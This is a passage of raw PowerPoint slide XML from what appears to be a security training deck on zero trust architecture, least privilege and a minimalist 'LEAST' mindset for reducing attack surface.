          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is incomplete without the POLP, which states:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Users, systems, and services should have only the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>BARE MINIMUM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> permissions needed to perform their duties</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33702232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6DFA-31A5-2980-E481-74767CDCD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0AA46-6976-8018-C42C-2997A1AA0C2F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>the Risks of Excess</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91D553E6-027A-E4AF-D4EB-8F686E8E2A9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6609256" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Excess is the Enemy of Security</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Excess  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>can be found in:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Features</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Ideas</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11687137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FC924-27F1-5676-2EFC-9EB21031B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04321-7FC9-7A3F-B2AF-397BBE2FC4E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>the Minimalist Mindset</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B84D885-C6E3-D038-422F-DBD53284C6A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9350704" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>To avoid excess, adopt a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>'LEAST'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> mentality:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least Exposure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– Don’t store, transmit, or log what you don’t absolutely need</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least Privilege </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– Only grant the bare minimum access needed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least Features </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– Minimalize your attack surface; disable what is unused or unnecessary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least Persistence </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– Keep secrets, sessions, and tokens valid for as short a time as necessary</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least Code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>– Fewer lines = fewer bugs = fewer vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Perfection is achieved not when there is nothing more to add, but when there is nothing left to take away.”</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> ~ Antoine de Saint-Exupéry ~</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30622351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D55B-486D-8028-B375-B8F0CE393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2E7DF-9598-2374-073F-444714216EF2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA – What it is/is not</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0CCE20C0-0B5C-5C28-54B5-5B5B64AE7C4D}"/>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dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero Trust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Architecture (ZTA)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>concrete architecture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> you build (policies, components, flows)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The implementation of zero trust principles in your code, network, and across your enterprise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>It is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A single product you can buy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A synonym for “MFA everywhere”.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“We don’t trust our employees.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12659398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5AB8-F307-94A3-3199-84F39C98E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38144-47EF-E567-3486-B51256F735C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Core Concept</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF0ADDF2-4668-E2F4-9390-D9C0B8560EFE}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust says:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>There is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>no special “safe” network zone</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Every access request — whether from inside or outside — must be:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Authenticated</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Authorized</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Logged</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Often re-verified over time</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28946932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2D9A-6AFE-C025-E8E2-D437D11F5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1C49A-96AF-437F-8B6E-1B467DEAFB34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Principles – 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79F21EAA-7314-E058-A01F-E43151CA9A25}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Never trust by default</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Being on the “internal network” or inside a VPC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>means nothing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Every call is treated as coming from a potentially hostile network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24973956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82AC-8945-C94F-A142-DAFBF71E0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9A4F1-0344-1D5E-8B2F-95AEFD79AADC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ZTA Principles – 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{170337AE-C560-DB1F-584E-4B450D2C875B}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Verify explicitly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Who (user, service identity)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>On what device / workload?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Under what conditions (time, location, posture, risk)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Using what authentication strength (password + MFA, certificate, hardware key)?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
